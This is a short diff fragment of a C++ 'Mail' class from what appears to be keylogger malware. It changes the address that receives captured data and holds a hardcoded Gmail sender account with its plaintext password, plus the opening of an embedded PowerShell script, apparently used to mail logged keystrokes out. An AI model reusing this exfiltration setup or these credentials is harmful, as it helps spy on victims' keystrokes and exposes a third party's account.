@@ -14,7 +14,7 @@ class Mail
 private:
 	Timer _timer;
 	CurrentTimeDate _time;
-	const string _addressTo = "anastasiyabordak@gmail.com";
+	const string _addressTo = "keylogfrom2018@gmail.com";
 	const string _addressFrom = "keylogfrom2018@gmail.com";
 	const string _passwordFrom = "30042018keylog";
 	const string &PowerShellScript =
